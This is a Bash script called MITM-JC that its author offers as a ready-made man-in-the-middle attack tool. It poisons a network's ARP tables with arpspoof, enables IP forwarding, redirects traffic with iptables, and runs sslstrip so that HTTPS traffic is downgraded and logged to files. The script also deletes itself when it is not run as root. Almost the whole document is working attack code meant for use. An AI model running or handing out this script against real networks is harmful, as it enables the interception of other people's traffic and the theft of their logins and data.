#!/bin/bash
reset
clear
##########################################################################
### MITM-JC ###														     #
															             #
#Readme date: Aug 2016													 #
#Author: Jairo Carneiro jairoccjunior@gmail.com						     #
#Github: https://github.com/jairoccjunior/MITM-JC						 #
																		 #
#Description - Script the instant induction at men in the middle (Attack)#
#These are others softwares and libs, modules that will be necessary.    #
#(+ Softwares: python - iptables - sslstrip - arpspoof )				 #
#(+ Modules: twisted.web - twisted.internet )							 #
																	     #
#Usage: ./mitm-jc² { on / off }										     #
																		 #
#Instructions -															 #
#1. Apply Permissions: chmod 755										 #
#2. The script must be run as root										 #
																	     #
#Known Issues -														     #
#Arp poisoning may cause overloads on large networks ;]	                 #
##########################################################################

#Carregando as Variaveis
VERSION="2.2"
PID=$!
BLACK=$(tput setaf 0)
RED=$(tput setaf 1)
GREEN=$(tput setaf 2)
YELLOW=$(tput setaf 3)
LIME_YELLOW=$(tput setaf 190)
POWDER_BLUE=$(tput setaf 153)
BLUE=$(tput setaf 4)
MAGENTA=$(tput setaf 5)
CYAN=$(tput setaf 6)
WHITE=$(tput setaf 7)
BRIGHT=$(tput bold)
NORMAL=$(tput sgr0)
BLINK=$(tput blink)
REVERSE=$(tput smso)
UNDERLINE=$(tput smul)
ROUTERS=`route -nF`
IPTABLES=`which iptables`
SSLSTRIP=`which sslstrip`
ARPSPOOF=`which arpspoof`
IFCONFIG=`which ifconfig`
INTERFACE=`$IFCONFIG | grep -m1 'eth'|awk '{print $1}' | cut -d : -f1`
KILL=`which kill`
KILLALL=`which killall`


col=50

export LANG=pt_BR
export LC_ALL=pt_BR
export LC_CTYPE=ISO-8859-1
export LESSCHASET=latin1

if [ "$(id -u)" != "0" ]; then
   clear
   echo ""
   echo "Running only with the administrative user"
   rm -rf "$0" &>/dev/null
   else


function INICIAR () {

echo ""
echo -n "Enter a name for the session: (name of the folder will be created where the log files): "
read -e SESSION
mkdir -p ~/$SESSION &>/dev/null
echo ""

echo ""
echo "-=Cleaning the old rules=-"
$IPTABLES -t nat -F
$IPTABLES -t nat -X
$IPTABLES -t nat -Z
$IPTABLES -t nat -F POSTROUTING
$IPTABLES -t nat -F PREROUTING
$IPTABLES -F INPUT
$IPTABLES -F OUTPUT 
$IPTABLES -F FORWARD
printf  '%s%*s%s \n' "$GREEN" $col "[OK]" "$NORMAL"

echo ""
echo "-=Freeing the passage of traffic on the nertwork=-"
echo "1" > /proc/sys/net/ipv4/ip_forward
echo ""
printf  '%s%*s%s \n' "$GREEN" $col "[OK]" "$NORMAL"

echo ""
echo "-=Redirecting traffic to the desired network=- (IPTABLES RULES)"
echo ""
echo -n "Enter the --dport to be LISTENING: "
read -e dport

echo -n "Enter the --toport to be REDIRECT: "
read -e toport

echo ""

VERIFICACAO=`netstat -tupan |egrep $toport| cut -d : -f 2|awk '{print $1}'`

	#	if ["$VERIFICACAO" == "$toport"]; then
	#		echo -n "Port already in use, choose another: "
	#		read -e toport
	#		else

echo -n "Which interface you want to use: "
echo ""
echo    "Interfaces Availables: { $INTERFACE }"

read -e FACE

echo -n "Which router you want to use: "
read -e ROUTER

echo -n "Enter a name for this network: "

read -e NET

$IPTABLES -t nat -A PREROUTING -p tcp --dport $dport -j REDIRECT --to-port $toport
$SSLSTRIP -w ~/$SESSION/$NET -a -l $toport -f lock.ico & #> /dev/null
$ARPSPOOF -i $FACE $ROUTER & #> /dev/null
sleep 1
	exit 0;
	#fi

}

function PARAR () {

echo ""
echo "=-Killing the daemon that governs here!=-"
$IPTABLES -t nat -F
$IPTABLES -t nat -X
$IPTABLES -t nat -Z
$IPTABLES -t nat -F POSTROUTING
$IPTABLES -t nat -F PREROUTING
$IPTABLES -F INPUT
$IPTABLES -F OUTPUT 
$IPTABLES -F FORWARD
$IPTABLES -t nat -F
$IPTABLES -P INPUT ACCEPT
$IPTABLES -P FORWARD ACCEPT
$IPTABLES -P OUTPUT ACCEPT


PIDSSLSTRIP=`ps ax|grep sslstrip|head -1|awk '{print $1}'`
PIDARPSPOOF=`ps ax|grep arpspoof|head -1|awk '{print $1}'`

$KILLALL $PIDSSLSTRIP &>/dev/null
$KILLALL $PIDARPSPOOF &>/dev/null
$KILL -9 $PIDSSLSTRIP &>/dev/null
$KILL -9 $PIDARPSPOOF &>/dev/null
$KILL  -9 $PID &>/dev/null

printf  '%s%*s%s \n' "$GREEN" $col "[OK]" "$NORMAL"
exit 0;
}
case "$1" in 
on)
echo "			### MITM-JC ###"

echo "Readme date: Aug 2016"
echo "Author: Jairo Carneiro jairoccjunior@gmail.com"
echo "Github: https://github.com/jairoccjunior/MITM-JC"
echo "Version: $VERSION"
INICIAR
;;
off)
clear
echo ""
echo "			### MITM-JC ###"

echo "Readme date: Aug 2016"
echo "Author: Jairo Carneiro jairoccjunior@gmail.com"
echo "Github: https://github.com/jairoccjunior/MITM-JC"
echo "Version: $VERSION"


PARAR
;;
*)
echo ""
echo "			### MITM-JC ###"

echo "Readme date: Aug 2016"
echo "Author: Jairo Carneiro jairoccjunior@gmail.com"
echo "Github: https://github.com/jairoccjunior/MITM-JC"
echo "Version: $VERSION"
echo ""
printf  '%s%*s%s \n' "$RED"
echo "Description - Script the instant induction at man in the middle (Attack)"
echo ""

echo "Usage: ./MITM-JC {on / off}"
printf  '%s%*s%s \n' "$NORMAL"
exit 1
esac
exit 0
fi

